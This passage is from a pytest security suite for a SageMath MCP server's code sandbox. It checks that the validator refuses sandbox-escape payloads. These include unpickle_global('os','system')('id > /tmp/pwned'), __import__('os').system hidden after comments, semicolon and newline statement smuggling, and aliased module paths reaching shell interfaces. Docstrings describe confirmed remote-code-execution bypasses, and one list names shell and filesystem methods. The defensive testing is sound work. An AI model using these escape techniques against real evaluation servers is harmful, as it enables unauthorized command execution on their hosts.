        (lambda f=latex.has_file: f('x; id > /tmp/pwned'))()

    The rule was written at the call site -- `Call(func=Attribute(...))` -- so
    binding the bound method to a name and calling the name passed validation.
    My own regression: I had written the check on the attribute node, then
    removed it as a duplicate of the call-site one. It was the broader of the
    two, not a duplicate.

    Wider than `latex`, and it predates that: `popen`, `rmtree` and the `spawn*`
    family have been on this list far longer, guarded the same call-only way, so
    an alias reached them too.
    """
    with pytest.raises(SecurityViolation):
        validate_module(ast.parse(code))


# --- Imports that change nothing are dropped, not refused -----------------------
# Callers cannot import, and that rule is load-bearing (item 27). But much of
# what arrives would achieve nothing -- a reflex `import numpy as np` nothing
# reads, a name the namespace already holds -- and refusing those costs the
# whole snippet for no gain. The safety argument for every shape dropped below
# is one: nothing is imported, so nothing new becomes reachable.


@pytest.mark.parametrize(
    "label,payload",
    [
        ("unused reflex import", "import numpy as np\nmatrix(QQ, [[1, 2], [3, 4]]).det()"),
        ("unused plain import", "import os\n2 + 2"),
        ("a name already offered",
         "from sage.rings.integer import Integer\nInteger(6).divisors()"),
        ("an offered name, aliased",
         "from sage.functions.log import exp as e_pow\ne_pow(0)"),
        ("several offered names", "from sage.all import matrix, vector\nmatrix(QQ, [[1]])"),
        ("star import of the namespace", "from sage.all import *\n2 + 2"),
        ("stdlib name Sage also offers",
         "from itertools import product\nlen(list(product([1], [2])))"),
    ],
)
def test_an_import_that_changes_nothing_is_dropped(label, payload) -> None:
    """Each of these validates, because the import is removed before it is judged."""
    module = rewrite_permitted_imports(
        ast.parse(payload), offered=ALLOWED_CALLER_NAMES, policy=SECURITY_POLICY
    )
    assert not [
        node for node in ast.walk(module)
        if isinstance(node, (ast.Import, ast.ImportFrom))
    ], f"{label}: the import survived the rewrite"
    validate_module(module, code=payload, policy=SECURITY_POLICY)


@pytest.mark.parametrize(
    "label,payload",
    [
        ("cython compiler",
         "from sage.misc.cython import compile_and_load\ncompile_and_load('x')"),
        ("gp interface", "from sage.interfaces.gp import Gp\nGp()"),
        ("unpickle_global",
         "from sage.misc.persist import unpickle_global\nunpickle_global('os', 'system')"),
        ("os under a fresh name", "from sage.all import os as m\nm.getuid()"),
        ("os under an offered name", "from sage.all import os as Integer\nInteger.getuid()"),
        ("a withheld name aliased", "from sage.misc.sh import sh as helper\nhelper('id')"),
        ("plain import of a used module", "import sage.misc.persist\nsage.misc.persist"),
        ("numpy, used", "import numpy as np\nnp.array([1, 2])"),
        ("star import of a used module",
         "from sage.misc.persist import *\nunpickle_global('os', 'system')"),
        # An unused from-import is NOT dropped: it names a specific object, and a
        # caller asking for one this server does not offer is told now rather
        # than on the next call, when the failure has moved to a bare name.
        ("unused from-import", "from sage.misc.persist import unpickle_global\n2 + 2"),
        ("unused from-import of a Sage internal",
         "from sage.algebras.askey_wilson import AlgebraMorphism\n2 + 2"),
    ],
)
def test_an_import_that_would_change_something_is_still_refused(label, payload) -> None:
    module = rewrite_permitted_imports(
        ast.parse(payload), offered=ALLOWED_CALLER_NAMES, policy=SECURITY_POLICY
    )
    with pytest.raises(SecurityViolation):
        validate_module(module, code=payload, policy=SECURITY_POLICY)


def test_the_rewrite_binds_the_offered_object_and_not_the_module_path() -> None:
    """What the caller ends up with is what they could already read.

    `from sage.misc.persist import Integer as n` names a module nobody may touch
    and asks for an object everybody may. The rewrite never imports the module,
    so the value bound is the namespace's `Integer` -- and if the name asked for
    were `unpickle_global`, no amount of aliasing would help.
    """
    payload = "from sage.misc.persist import Integer as n\nn(6)"
    module = rewrite_permitted_imports(
        ast.parse(payload), offered=ALLOWED_CALLER_NAMES, policy=SECURITY_POLICY
    )
    assignments = [node for node in module.body if isinstance(node, ast.Assign)]
    assert len(assignments) == 1
    assert assignments[0].targets[0].id == "n"
    assert assignments[0].value.id == "Integer"
    validate_module(module, code=payload, policy=SECURITY_POLICY)

    smuggle = "from sage.misc.persist import unpickle_global as n\nn('os', 'system')"
    rewritten = rewrite_permitted_imports(
        ast.parse(smuggle), offered=ALLOWED_CALLER_NAMES, policy=SECURITY_POLICY
    )
    with pytest.raises(SecurityViolation):
        validate_module(rewritten, code=smuggle, policy=SECURITY_POLICY)


def test_a_refused_import_says_what_to_use_instead() -> None:
    """The message is the fix when the import genuinely asks for something new."""
    for payload, expected in (
        ("import numpy as np\nnp.linalg.det([[1, 2]])", "matrix\\(RDF"),
        ("import scipy\nscipy.integrate.quad(lambda t: t, 0, 1)", "numerical_integral"),
        ("import sympy\nsympy.diff(1)", "superset"),
    ):
        module = rewrite_permitted_imports(
            ast.parse(payload), offered=ALLOWED_CALLER_NAMES, policy=SECURITY_POLICY
        )
        with pytest.raises(SecurityViolation, match=expected):
            validate_module(module, code=payload, policy=SECURITY_POLICY)


def test_the_import_rewrite_is_inert_when_the_allowlist_is_off() -> None:
    """The early return in `rewrite_permitted_imports`, which nothing reached.

    The rewrite exists to drop imports that change nothing *given* an allowlist
    to check them against. With `enforce_name_allowlist` off there is no such
    list, so it hands the module back untouched and lets the ordinary rules
    decide -- the configuration a deployment gets from
    `SAGEMATH_MCP_SECURITY_ENABLED=false` and the one `trusted_policy()` uses
    for generated code, which must keep its own imports.

    Untested, this was the last line between the suite and its 100% gate.
    """
    from dataclasses import replace

    from sagemath_mcp.security import rewrite_permitted_imports

    module = ast.parse("import numpy as np\nnp.array([1, 2])")
    relaxed = replace(SECURITY_POLICY, enforce_name_allowlist=False)

    returned = rewrite_permitted_imports(module, offered=frozenset(), policy=relaxed)

    assert returned is module, "the rewrite must hand back the same module untouched"
    assert any(isinstance(node, ast.Import) for node in ast.walk(returned)), (
        "the import must survive for the ordinary rules to judge"
    )


def test_a_global_declaration_reaches_nothing() -> None:
    """`global` was held back a round longer than `nonlocal`. This is the round.

    Declaring a name global records it as the caller's own, so the question is
    whether that claim can reach an object they could not otherwise have. Two
    rules upstream say no, and each is asserted here: a name that is live but
    not offered is refused whatever authorizes it (item 37), and a name whose
    object the worker scrubbed has nothing left to reach.

    Confirmed against SageMath 10.9 for all three shapes:

        global unpickle_global; unpickle_global = 1   -> reads back 1
        global unpickle_global (no assignment)        -> NameError, the object is gone
        global cython / global attrcall               -> refused by name
    """
    # Still refused by name, declaration or not: these are live, allowlisted, or
    # evaluation primitives.
    for name in ("cython", "attrcall", "sage_input", "preparse", "getattr", "exec"):
        payload = f"def f():\n    global {name}\n    {name} = 1\nf()\n{name}"
        with pytest.raises(SecurityViolation):
            validate_module(ast.parse(payload), code=payload, policy=SECURITY_POLICY)

    # Permitted, and harmless: the object was scrubbed, so the caller can only
    # ever read back their own value.
    for name in ("unpickle_global", "db", "gap", "maxima"):
        payload = f"def f():\n    global {name}\n    {name} = 1\nf()\n{name}"
        validate_module(ast.parse(payload), code=payload, policy=SECURITY_POLICY)

    # And the declaration buys nothing an assignment does not: both spellings of
    # overwriting an offered name are permitted, which is the point.
    validate_module(ast.parse("SR = 5"), code="SR = 5", policy=SECURITY_POLICY)
    overwrite = "def k():\n    global SR\n    SR = 5"
    validate_module(ast.parse(overwrite), code=overwrite, policy=SECURITY_POLICY)


def test_oversized_code_is_refused_by_length_not_by_the_parser() -> None:
    """The length limit exists; the parser was reaching the input first.

    `max_source_chars` is 131072 and this is 140003, so the policy has an answer
    ready -- "Sage code exceeds maximum length" -- but the worker parsed before
    it validated, and CPython's parser gave up first:

        RecursionError: maximum recursion depth exceeded during ast construction

    Nothing escaped and the worker survived; the cost is a caller told their
    mathematics broke the interpreter when the truth is that it is too long. The
    limit was also decorative for this shape, which is worse than not having one.

    Deep-but-short code was never the problem: `len(len(len(...)))` at 185 levels
    is caught by the AST-depth rule with its own clear message, and that stays.
    """
    from sagemath_mcp.security import check_source_length

    oversized = "x=" + "1+" * 70000 + "1"
    assert len(oversized) > SECURITY_POLICY.max_source_chars

    with pytest.raises(SecurityViolation, match="exceeds maximum length"):
        check_source_length(oversized, SECURITY_POLICY)

    # Ordinary code passes through untouched.
    check_source_length("integrate(x^2, x)", SECURITY_POLICY)


def test_an_injection_suspends_the_allowlist_and_nothing_else() -> None:
    """`A.inject_variables()` creates names no static analysis can know.

    `R.<u, v> = QQ[]` is covered because the preparser binds statically, but
    `R = PolynomialRing(QQ, 'u,v'); R.inject_variables(); u^2 + v` is the same
    mathematics written the other way, and it was refused. A snippet that asks
    for an injection therefore has the *allowlist* half of the deny-by-default
    rule suspended.

    Only that half. The withheld check is the half with the security content --
    every name that is live and not offered stays refused whatever the snippet
    contains -- and suspending the other buys names that are not live at all,
    which are either the injected ones or a NameError. Every other rule is
    untouched, which is what this asserts.
    """
    prefix = "R = PolynomialRing(QQ, 'g')\nR.inject_variables()\n"

    # The point of the change: an unknown name is no longer refused outright.
    validate_module(ast.parse(prefix + "g^2 + 1"), code=prefix, policy=SECURITY_POLICY)

    # And every rule that was doing real work still is.
    for payload in (
        "cython('x')",
        "sage_input(1)",
        "attrcall('save', '/tmp/x')(1)",
        "os.getuid()",
        "().__class__.__bases__[0].__subclasses__()",
        "M = matrix(QQ, [[1]])\nM.save('/tmp/x')",
        "operator.attrgetter('__class__')('')",
    ):
        source = prefix + payload
        with pytest.raises(SecurityViolation):
            validate_module(ast.parse(source), code=source, policy=SECURITY_POLICY)

    # A withheld name -- live, and not offered -- stays refused even here.
    withheld = prefix + "smuggled"
    with pytest.raises(SecurityViolation):
        validate_module(
            ast.parse(withheld), code=withheld, policy=SECURITY_POLICY,
            withheld_names=frozenset({"smuggled"}),
        )

    # Without an injection in the snippet, nothing is suspended.
    with pytest.raises(SecurityViolation):
        validate_module(ast.parse("g^2 + 1"), code="g^2 + 1", policy=SECURITY_POLICY)


# Combinatorial containers with a `.remove` that removes an element from a
# structure -- a tableau cell, a tree child, a bit. Reviewed, and the reason
# `remove` is not a forbidden attribute name: this is what it was refusing.
_COMBINATORIAL_REMOVE = frozenset({
    "Bitset", "IncreasingTableau", "LabelledOrderedTree", "LabelledRootedTree",
    "LittlewoodRichardsonTableau", "OrderedTree", "ParallelogramPolyomino",
    "RibbonShapedTableau", "RibbonTableau", "RootedTree", "RowStandardTableau",
    "SemistandardSuperTableau", "SemistandardTableau", "SkewTableau",
    "StandardSuperTableau", "StandardTableau", "StrongTableau", "Tableau",
    "WeakReversePlanePartition",
})


def test_no_offered_object_answers_to_a_shell_or_filesystem_name() -> None:
    """The guard the `remove`/`system` relaxation actually rests on.

    Those names left `forbidden_attribute_names` on the argument that `os` is
    unreadable and forbidden as a parent, so nothing dangerous could be reached
    through a method of that name. That argument was incomplete, and
    `maxima_calculus` was the counterexample: a live MaximaLib interface, bound
    in the namespace as an alias `sage/calculus/all.py` created, exposing
    `.system`, `.unlink`, `.popen`, `.fork` -- an interface object fabricates
    *every* attribute on demand, so no name-based rule could have covered it.

    The real defence is that no such object is offered, which is a property of
    the namespace rather than of the rules, so it is checked here rather than
    argued. Everything that survives is a combinatorial container whose
    `.remove` takes a cell out of a tableau.

    A new name here means either the object should not be offered, or the method
    name belongs back in `forbidden_attribute_names`.
    """
    pytest.importorskip("sage.all")
    import warnings

    from sagemath_mcp import _sage_worker
    from sagemath_mcp.allowlist import ALLOWED_CALLER_NAMES

    capability = ("system", "unlink", "rmdir", "walk", "rmtree", "popen",
                  "spawnv", "fork", "execv")
    with warnings.catch_warnings():
        warnings.simplefilter("ignore")
        namespace = _sage_worker._build_namespace()

    offenders: dict[str, list[str]] = {}
    for name in sorted(ALLOWED_CALLER_NAMES):
        value = namespace.get(name)
        if value is None:
            continue
        try:
            found = [method for method in capability if hasattr(value, method)]
        except Exception:  # an object that raises on hasattr is not offering it
            continue
        if found:
            offenders[name] = found

    assert not offenders, (
        "an offered object answers to a shell or filesystem method name, which "
        "is what `remove` and `system` leaving forbidden_attribute_names assumed "
        f"could not happen: {offenders}"
    )

    # `.remove` is checked separately because the answer is not "none": a great
    # deal of combinatorics has one, and that is precisely why the name was
    # freed. The list is reviewed, so an addition has to be looked at.
    removers = set()
    for name in sorted(ALLOWED_CALLER_NAMES):
        value = namespace.get(name)
        try:
            if value is not None and hasattr(value, "remove"):
                removers.add(name)
        except Exception:
            continue
    assert removers <= _COMBINATORIAL_REMOVE, (
        "a new offered object has a .remove that nobody has reviewed: "
        f"{sorted(removers - _COMBINATORIAL_REMOVE)}"
    )


def test_the_length_check_is_silent_when_the_policy_is_off() -> None:
    """`SAGEMATH_MCP_SECURITY_ENABLED=false` disables the policy, this included.

    The limit is part of the policy, not a separate sanity rail, so turning the
    policy off turns it off too. Worth stating rather than assuming: a limit
    that survived the switch would be the only rule that did.
    """
    from dataclasses import replace

    from sagemath_mcp.security import check_source_length

    oversized = "x=" + "1+" * 70000 + "1"
    disabled = replace(SECURITY_POLICY, enabled=False)

    check_source_length(oversized, disabled)   # must not raise

    with pytest.raises(SecurityViolation, match="exceeds maximum length"):
        check_source_length(oversized, SECURITY_POLICY)


@pytest.mark.parametrize(
    "statement,flag,word",
    [
        ("def f():\n    global g\n    g = 1", "forbid_global_stmt", "Global"),
        (
            "def f():\n    def h():\n        nonlocal n\n        n = 1",
            "forbid_nonlocal_stmt",
            "Nonlocal",
        ),
    ],
    ids=["global", "nonlocal"],
)
def test_the_scope_statements_are_still_refusable(statement: str, flag: str, word: str) -> None:
    """Both default to permitted now; the rules behind them still work.

    `global` and `nonlocal` were opened once it was shown they reach nothing a
    module-level assignment does not -- an accumulator inside a function is
    ordinary code, and the names they declare are governed by the withheld rule
    like any other. The refusals stayed in the policy as switches a deployment
    can turn back on, and a switch nothing exercises is a switch nobody knows is
    broken.
    """
    from dataclasses import replace

    strict = replace(SECURITY_POLICY, **{flag: True})

    with pytest.raises(SecurityViolation, match=f"{word} statements are not permitted"):
        validate_module(ast.parse(statement), policy=strict)

    # And with the shipped default, the same code is ordinary mathematics.
    validate_module(ast.parse(statement), policy=SECURITY_POLICY)


FRAGMENT_PAYLOADS = [
    ("unpickle-global", "unpickle_global('os','system')('id > /tmp/pwned')"),
    ("maxima-calculus", "maxima_calculus.system('id > /tmp/pwned')"),
    ("cython", "cython('print(1)')"),
    ("save-session", "save_session('/tmp/pwned')"),
    ("get-remote-file", "get_remote_file('http://x/y')"),
]


@pytest.mark.parametrize(
    "fragment", [f for _, f in FRAGMENT_PAYLOADS], ids=[i for i, _ in FRAGMENT_PAYLOADS],
)
def test_a_tool_parameter_cannot_name_what_the_scrub_removes(fragment: str) -> None:
    """The tool surface's own door, which the namespace scrub does not reach.

    Confirmed as remote code execution against SageMath 10.9 -- it wrote
    `uid=1001(sage)`:

        calculate_expression("unpickle_global('os','system')('id > /tmp/x')")

    Tool parameters are checked by the *fragment* policy, which sets
    `enforce_name_allowlist=False`, because a parameter legitimately names
    things in a template's context. The denylist still applies, which is why
    `attrcall`, `raw_getattr` and `operator` were refused. `unpickle_global` was
    never on the denylist: the namespace scrub handled it -- and the scrub
    cannot reach a fragment, because `sage_eval` evaluates "in namespace of
    sage.all plus locals", not in the worker's namespace.

    So resealing that namespace closes nothing here, whenever it runs. The
    decision has to be made at validation, and the narrow form is the right one:
    refuse exactly the names the scrub removes, since those are the ones relying
    on it. Refusing the whole allowlist instead would cost the tools mathematics
    they legitimately reach for.
    """
    from fastmcp.exceptions import ToolError

    from sagemath_mcp.codegen import _validated_expression

    # The gate wraps the violation for the client, so this is what a caller sees.
    with pytest.raises(ToolError, match="Rejected by the security policy"):
        _validated_expression(fragment)


@pytest.mark.parametrize(
    "fragment",
    [
        "x^2 - 1",
        "integrate(sin(x), x)",
        "matrix([[1, 2], [3, 4]]).det()",
        "codes.HammingCode(GF(2), 3).minimum_distance()",
        "graphs.PetersenGraph().chromatic_number()",
        "EllipticCurve([0, 0, 1, -1, 0]).rank()",
    ],
)
def test_the_mathematics_tool_parameters_carry_still_passes(fragment: str) -> None:
    """The other half, and the reason this is narrow rather than an allowlist.

    A parameter names things a template puts in scope -- `codes.HammingCode`,
    `graphs.PetersenGraph` -- which is exactly what the fragment policy exists
    to permit.
    """
    from sagemath_mcp.codegen import _validated_expression

    _validated_expression(fragment)


@pytest.mark.parametrize(
    "fragment",
    [
        # Sage-only syntax the Python parser rejects, so the token screen runs
        # instead of the AST path -- with a scrubbed name riding along. Written
        # without a `;`, which _validated_expression now refuses outright before
        # the screen ever runs (see test_a_semicolon_cannot_smuggle_a_statement).
        "R.<xx> = QQ[unpickle_global]",
        "unpickle_global('os','system')('id') if R.<y> = QQ[] else 0",
        "K.<a> = GF(9)[cython]",
    ],
    ids=["generator-prefix", "unparseable-tail", "field-generator"],
)
def test_the_token_screen_refuses_scrubbed_names_too(fragment: str) -> None:
    """The unparseable path had a narrower screen than the parseable one.

    A fragment the Python parser rejects -- Sage's `R.<x> = QQ[]` generator
    syntax, say -- skips AST validation and gets a token screen instead. That
    screen checked `forbidden_call_names` and `forbidden_attribute_parents` but
    not the names the scrub removes, so wrapping `unpickle_global` in generator
    syntax slipped it past the very check added for the parseable case. A name
    is a name whatever surrounds it; both gates must consult the same set.

    (`sage_eval` happens to reject generator syntax, so this specific payload
    would not execute today -- but the screen is the boundary, and it should not
    depend on a downstream accident.)
    """
    from fastmcp.exceptions import ToolError

    from sagemath_mcp.codegen import _validated_expression

    with pytest.raises(ToolError, match=r"is blocked|not a name this server offers"):
        _validated_expression(fragment)


def test_the_scrub_covers_sage_eval_and_not_only_the_namespace() -> None:
    """The denylist was decorative on every path through a generated template.

    Caller code runs `exec` against the worker namespace, so scrubbing that
    namespace protects it. A tool's fragment does not: every template is built
    on `sage_eval`, and `sage_eval` resolves against `sage.all`'s own globals
    without ever consulting the namespace it was handed. With the namespace
    scrubbed clean, this returned the real function:

        sage_eval('unpickle_global')   -> cython_function_or_method

    and the same for `cython`, `sh`, `os`, `attrcall`, `get_remote_file` and
    `maxima_calculus` -- every name the denylist removes.

    Nothing was exploitable: a caller string reaching a template must pass
    `_validated_expression` first, which enforces the allowlist, and a
    structural test already refuses any template that interpolates without a
    gate. What it meant was that the gate was the *only* lock on that path
    rather than the second, while this file's whole model is that the object
    should not be there either. Found by a review asking why
    `maxima_calculus.system(...)` reached Maxima at all before dying on an ECL
    internal.

    The scrub now removes the names from `sage.all` as well. That is
    process-local and deliberate: a worker whose job is untrusted mathematics
    has no business keeping a shell in its copy of the module.
    """
    pytest.importorskip("sage.all")
    import warnings

    from sagemath_mcp import _sage_worker

    with warnings.catch_warnings():
        warnings.simplefilter("ignore")
        _sage_worker._build_namespace()

    from sage.misc.sage_eval import sage_eval

    for name in (
        "unpickle_global", "maxima_calculus", "cython", "sh", "gp", "maxima",
        "os", "sys", "attrcall", "get_remote_file", "load", "fortran",
    ):
        with pytest.raises(NameError):
            sage_eval(name)

    # And what generated code imports by name is still there, or every tool
    # breaks at once -- which is exactly what happened when `sage_eval` itself
    # was stripped, since it comes from a module the denylist removes wholesale.
    import sage.all

    for needed in _sage_worker._TRUSTED_TEMPLATE_IMPORTS:
        assert needed in sage.all.__dict__, (
            f"generated code imports {needed} from sage.all and it is gone"
        )


@pytest.mark.parametrize(
    "fragment",
    [
        "sage.all.unpickle_global('os', 'system')('id')",
        "sage.misc.persist.unpickle_global('os', 'system')('id')",
        "sage.misc.sh.sh('id')",
        "sage.all.sage_eval('1')",
        "sage",
    ],
    ids=["all-leaf", "misc-persist", "misc-sh", "all-sage-eval", "bare"],
)
def test_a_tool_parameter_cannot_walk_the_sage_module_tree(fragment: str) -> None:
    """The backstop the fragment gate was missing for the `sage.all.X` shape.

    The scrub-name check walks `ast.Name` nodes, so a dangerous name reached as
    an *attribute* -- `sage.all.unpickle_global`, where `unpickle_global` is a
    `.attr` and only `sage` is a Name -- rode straight past it. It was not
    exploitable, because `sage_eval` resolves in `sage.all` and the sage.all
    scrub had emptied that name. But the gate gave no independent backstop: it
    accepted `sage.all.<anything>` and leaned entirely on the scrub being
    complete. One missed name in the scrub list would have made the shape a
    gate-passing RCE, with no second line of defence.

    So the gate now refuses a fragment that traverses the bare `sage` module at
    all. No tool parameter has a reason to: the point of `from sage.all import
    *` is that `matrix`, `integrate`, `codes.HammingCode` are named directly.
    Checking the *root* rather than the leaf avoids the collision a leaf check
    would hit -- `load` and `save` are in the scrub set and are also ordinary
    method names.
    """
    from fastmcp.exceptions import ToolError

    from sagemath_mcp.codegen import _validated_expression

    with pytest.raises(ToolError, match="Rejected by the security policy"):
        _validated_expression(fragment)


@pytest.mark.parametrize(
    "fragment",
    [
        "codes.HammingCode(GF(2), 3).minimum_distance()",
        "graphs.PetersenGraph().chromatic_number()",
        "matrix([[1, 2], [3, 4]]).transpose()",  # ordinary attribute access
        "EllipticCurve([0, 0, 1, -1, 0]).rank()",
        "integrate(sin(x), x)",
    ],
)
def test_the_sage_root_backstop_leaves_ordinary_parameters_alone(fragment: str) -> None:
    """It refuses `sage.`, and nothing else.

    A `codes.` or `graphs.` chain is rooted at a name the templates put in
    scope, not at `sage`, and ordinary `.transpose()`/`.rank()` attribute access
    is untouched -- the rule keys on the root name `sage`, which no legitimate
    tool parameter uses.
    """
    from sagemath_mcp.codegen import _validated_expression

    _validated_expression(fragment)


# --- 2026-08-16 review, items 49-56 -----------------------------------------

# Module objects reached as the TERMINAL segment of a chain, then rebound and
# used -- the parent loop only ever inspected segments[:-1], so the leaf module
# was never seen. `m = sage.env.os; m.system(...)` ran a shell (item 49). The
# `f = sage.misc.persist` / `f = sage.misc.trace` forms are the same shape one
# submodule up (item 52's terminal-extraction variant).
TERMINAL_MODULE_EXTRACTION = [
    ("env-os", "m = sage.env.os\nm.system('id')"),
    ("env-sys", "p = sage.env.sys\np.modules['os'].system('id')"),
    ("desolvers-os", "m = desolvers.os\nm.system('id')"),
    ("bare-terminal-os", "sage.env.os"),
    ("bare-terminal-persist", "f = sage.misc.persist"),
    ("bare-terminal-trace", "f = sage.misc.trace"),
    ("bare-terminal-sh", "x = sage.misc.sh"),
]


@pytest.mark.parametrize(
    ("case_id", "payload"),
    TERMINAL_MODULE_EXTRACTION,
    ids=[c for c, _ in TERMINAL_MODULE_EXTRACTION],
)
def test_a_terminal_module_cannot_be_extracted_from_a_module_path(case_id, payload):
    with pytest.raises(SecurityViolation):
        _validate(payload)


# Aliasing the allowlisted `sage` module bought a whole-chain exemption: the
# caller-owned root `s` disabled the parent check for every segment after it, so
# `s.misc.persist.unpickle_global(...)` walked past `persist` (item 52). The
# exemption now covers the ROOT only.
ALIASED_MODULE_PATH = [
    ("s-persist", "s = sage\ns.misc.persist.unpickle_global('os','system')('id')"),
    ("s-sh", "s = sage\ns.misc.sh.sh('id')"),
    ("s-trace", "s = sage\ns.misc.trace.trace('code')"),
    ("default-arg", "def g(s=sage): return s.misc.persist.unpickle_global('os','system')('id')"),
    ("comprehension", "[s.misc.sh.sh('id') for s in [sage]]"),
]


@pytest.mark.parametrize(
    ("case_id", "payload"), ALIASED_MODULE_PATH, ids=[c for c, _ in ALIASED_MODULE_PATH]
)
def test_aliasing_sage_does_not_exempt_a_deeper_forbidden_parent(case_id, payload):
    with pytest.raises(SecurityViolation):
        _validate(payload)


def test_a_rebound_forbidden_parent_name_is_still_arithmetic():
    """The exemption the item-52 fix narrowed must still cover its one real use.

    `sh` is a forbidden parent so `sage.misc.sh.sh(...)` is refused, but a caller
    who binds `sh` to their own value is doing arithmetic, and `sh.bit_length()`
    keeps the exemption because `sh` is the ROOT of that chain.
    """
    _validate("sh = 2\nsh.bit_length()")
    _validate("trace = matrix([[1, 2], [3, 4]])\ntrace.trace()")


def test_a_real_method_named_like_a_forbidden_parent_is_left_alone():
    """`.trace()`, `.operator()` and `.pari()` are mathematics, not modules."""
    _validate("matrix([[1, 2], [3, 4]]).trace()")
    _validate("(x + y).operator()")
    _validate("SR(1).operator()")


def test_the_gp_interface_method_is_refused(case_id=None):
    """`<obj>.gp()` reconstructs the GP interpreter the denylist removes (item 53)."""
    with pytest.raises(SecurityViolation):
        _validate("L.gp()")
    with pytest.raises(SecurityViolation):
        _validate("Dokchitser(conductor=1, gammaV=[0], weight=1, eps=1).gp()")


# The fragment gate (tool parameters) runs with the allowlist off, so the four
# Python evaluation primitives that "reach nothing" on the caller path DO reach
# the real builtins here, through sage_eval's sage.all globals (item 54).
FRAGMENT_EVAL_PRIMITIVES = [
    ("eval", "eval('__import__(\"os\").system(\"id\")')"),
    ("locals-builtins", "locals()['__builtins__']['eval']('1')"),
    ("vars", "vars()"),
    ("input", "input()"),
]


@pytest.mark.parametrize(
    ("case_id", "fragment"),
    FRAGMENT_EVAL_PRIMITIVES,
    ids=[c for c, _ in FRAGMENT_EVAL_PRIMITIVES],
)
def test_the_fragment_gate_refuses_the_evaluation_primitives(case_id, fragment):
    from fastmcp.exceptions import ToolError

    from sagemath_mcp.codegen import _validated_expression

    with pytest.raises(ToolError):
        _validated_expression(fragment)


def test_a_comment_cannot_hide_a_payload_from_the_split(case_id=None):
    """`1 # ... = payload` validated as `1`, then the runtime split ran the
    hidden right-hand side (item 55). Comments are refused at the gate."""
    from fastmcp.exceptions import ToolError

    from sagemath_mcp.codegen import _validated_expression

    with pytest.raises(ToolError):
        _validated_expression('1 # eval("x") = __import__("os").system("id")')
    with pytest.raises(ToolError):
        _validated_expression("x^2 - 1 # = __import__('os').system('id')")


def test_a_semicolon_cannot_smuggle_a_statement(case_id=None):
    """A fragment is one expression; `;` made it two once interpolated (item 56)."""
    from fastmcp.exceptions import ToolError

    from sagemath_mcp.codegen import _validated_expression

    with pytest.raises(ToolError):
        _validated_expression("SymmetricGroup(5); _z = save(1, '/tmp/x')")


def test_a_newline_is_folded_out_so_it_cannot_break_a_statement(case_id=None):
    """`group_operation` interpolates the fragment verbatim, so a newline would
    become a statement break (item 56). The gate folds it to a space, which
    turns a two-statement payload into a syntax error rather than an injection,
    while a genuinely wrapped single expression still passes."""
    from sagemath_mcp.codegen import _validated_expression

    # A wrapped single expression survives, folded.
    assert _validated_expression("2 +\n2") == "2 + 2"
    # The returned value never contains a newline, whatever came in.
    folded = _validated_expression("SymmetricGroup(5)\n_z = 1")
    assert "\n" not in folded


# Names removed from the allowlist because a bare-name / provenance removal did
# not remove the capability behind them (items 50, 51, 53). Deny-by-default now
# refuses each -- they are no longer offered.
REMOVED_FROM_ALLOWLIST = [
    ("Pari", "Pari('system(\"id\")')"),
    ("PariRing", "PariRing()('system(\"id\")')"),
    ("PariGroup", "PariGroup('x', 1)"),
    ("libgap-call", "libgap(5)"),
    ("libgap-Exec", "libgap.Exec('id')"),
    ("libgap-factory", "libgap.function_factory('Exec')"),
    ("Dokchitser", "Dokchitser(conductor=1, gammaV=[0], weight=1, eps=1)"),
]


@pytest.mark.parametrize(
    ("case_id", "payload"),
    REMOVED_FROM_ALLOWLIST,
    ids=[c for c, _ in REMOVED_FROM_ALLOWLIST],
)
def test_names_that_reconstruct_a_removed_capability_are_refused(case_id, payload):
    with pytest.raises(SecurityViolation):
        _validate(payload)


def test_an_untokenizable_fragment_is_still_rejected(case_id=None):
    """A fragment that will not even tokenize (unbalanced brackets) must not
    slip through the statement-smuggling screen -- the parse/screen path below
    it refuses it on its own terms."""
    from fastmcp.exceptions import ToolError

    from sagemath_mcp.codegen import _validated_expression

    with pytest.raises(ToolError):
        _validated_expression("matrix([1, 2")


def test_the_guarded_attrcall_delegates_only_after_the_screen() -> None:
    """In real Sage the wrapper hands back Sage's own AttrCallObject for a
    screened name -- full REPL semantics, sort keys included -- and refuses the
    file-writing and evaluation names at run time even though the validator
    already refuses the spellings that could carry them. Defense in depth: a
    future validator gap buys a ValueError, not a file."""
    pytest.importorskip("sage.all")
    from sagemath_mcp import _sage_worker

    key = _sage_worker._guarded_attrcall("degree")
    from sage.all import QQ, PolynomialRing

    ring = PolynomialRing(QQ, "T")
    generator = ring.gen()
    assert key(generator**5 + generator) == 5

    for forbidden in ("save", "eval", "gp", "__class__", "dump"):
        with pytest.raises(ValueError):
            _sage_worker._guarded_attrcall(forbidden)


@pytest.mark.asyncio
async def test_an_injection_does_not_unlock_withheld_names() -> None:
    """A session that ran `inject_variables` has the *injected* names recorded,
    not a blanket pass: the interfaces stay refused afterwards, by the same
    withheld rule as before."""
    pytest.importorskip("sage.all")
    from sagemath_mcp.session import SageEvaluationError, SageSession

    session = SageSession("inject-withheld", None)
    try:
        await session.evaluate(
            "R = PolynomialRing(QQ, 'u,v')\nR.inject_variables()",
            want_latex=False, capture_stdout=True,
        )
        with pytest.raises(SageEvaluationError) as caught:
            await session.evaluate(
                "gp('factor(2^64+1)')", want_latex=False, capture_stdout=True
            )
        assert "gp" in str(caught.value)
    finally:
        await session.shutdown()
